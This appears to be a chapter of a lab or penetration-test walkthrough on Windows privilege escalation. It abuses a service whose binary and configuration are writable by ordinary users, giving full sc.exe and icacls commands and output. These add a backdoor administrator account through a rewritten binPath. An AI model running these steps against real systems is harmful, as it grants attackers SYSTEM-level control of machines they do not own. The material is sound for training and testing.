# 05 — Privilege escalation — a service nobody locked down

Goal: turn PowerUp's claim into SYSTEM. Verify the ACL by hand, then choose between *replacing the
binary* and *reconfiguring the service* — the second writes nothing to disk.

---

## 5.1 Verify, don't trust

```cmd
sc.exe qc GPGOrchestrator
icacls "C:\Program Files\MilleGPG5\GPGService.exe"
```

```
SERVICE_NAME: GPGOrchestrator
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        BINARY_PATH_NAME   : "C:\Program Files\MilleGPG5\GPGService.exe"
        SERVICE_START_NAME : LocalSystem

C:\Program Files\MilleGPG5\GPGService.exe BUILTIN\Users:(R)
                                          BUILTIN\Users:(I)(M)
                                          NT AUTHORITY\SYSTEM:(I)(F)
                                          BUILTIN\Administrators:(I)(F)
                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
```

`BUILTIN\Users:(I)(M)` — **inherited Modify**. Inherited is the important word: this is not a
per-user grant that missed cleanup, it is the file's default ACL, so *every* local user can rewrite a
binary that LocalSystem executes.

## 5.2 Read the service object as well

```cmd
sc.exe sdshow GPGOrchestrator
```

```
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
  (A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BU)
```

The last ACE, for `BUILTIN\Users` (`BU`):

| Right | Means |
|---|---|
| `DC` | **change service configuration — write `binPath`** |
| `RP` | start the service |
| `DT` | stop the service |
| `WD` | rewrite the DACL |
| `LC/SW/RP/WP/LO/CR/RC` | query, enumerate, read — harmless |

So there are **two independent weaknesses**, and the second one is strictly better:

1. **The binary is writable.** Replace `GPGService.exe` with an executable and start the service.
   Downside: a file lands in `Program Files`, which is exactly what antivirus watches.
2. **The service object is writable.** Repoint `binPath` at `cmd.exe` with an argument. No binary to
   scan, nothing dropped on disk, and the command runs as LocalSystem.

## 5.3 Execute as SYSTEM

From **`cmd.exe`** (see 5.5 — the quoting matters):

```cmd
sc.exe stop GPGOrchestrator
sc.exe config GPGOrchestrator binPath= "cmd.exe /c net user hacker P@ssw0rd123! /add & net localgroup administrators hacker /add"
sc.exe start GPGOrchestrator
```

```
SERVICE_NAME: GPGOrchestrator
        STATE              : 4  RUNNING
[SC] ChangeServiceConfig SUCCESS
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

> **1053 is the success signal.** SCM waits ~30 seconds for the process to call
> `StartServiceCtrlDispatcher` and report `SERVICE_RUNNING`. `cmd.exe` never does — it runs the
> command line and exits. The command executed as LocalSystem; only the *service handshake* failed.
> Do not read 1053 as "didn't work", and do not blindly retry — check the effect.

The `&` matters: the account is created by the first `net user`, and the group add runs regardless of
the first command's exit status. Two separate `sc config` + `start` cycles are cleaner if you want
each step's output.

## 5.4 Confirm it

```cmd
net user hacker
net localgroup administrators
```

```
User name                    hacker
Local Group Memberships      *Administrators       *Users

Alias name     administrators
Members
-------------------------------------------------------------------------------
Admin
Administrator
cloudbase-init
hacker
The command completed successfully.
```

A local administrator now exists with a password of our choosing. Escalation is complete; what is
left (chapter 06) is turning it into a *usable* admin session.

## 5.5 The quoting trap, and the 1053 that wasn't

Two mistakes cost a round trip each, and both are worth knowing:

**Wrong shell, wrong quotes.** In `cmd.exe`, single quotes are ordinary characters — they do not
group arguments:

```
C:\> sc.exe config GPGOrchestrator binPath= 'cmd.exe /c reg add ... /f'
DESCRIPTION:
        Modifies a service entry in the registry and Service Database.
USAGE:
        sc <server> config [service name] <option1> <option2>...
```

`sc` printed its usage banner and **changed nothing**. Under PowerShell (`PS C:\>`) the same
single-quoted form is correct; under `cmd.exe` it must be double quotes. The prompt tells you which
shell you are in — check it before blaming the tool.

**Stale `binPath`.** Because that `config` failed, the next `sc.exe start` re-ran the *previous*
`binPath` (a `type proof.txt` command), which is why no reverse shell appeared even though a payload
had been uploaded. `binPath` persists until changed:

```cmd
sc.exe qc GPGOrchestrator
```

Run that before every `start`. If it does not show the command you just intended, the `config`
failed and `start` is re-running history.
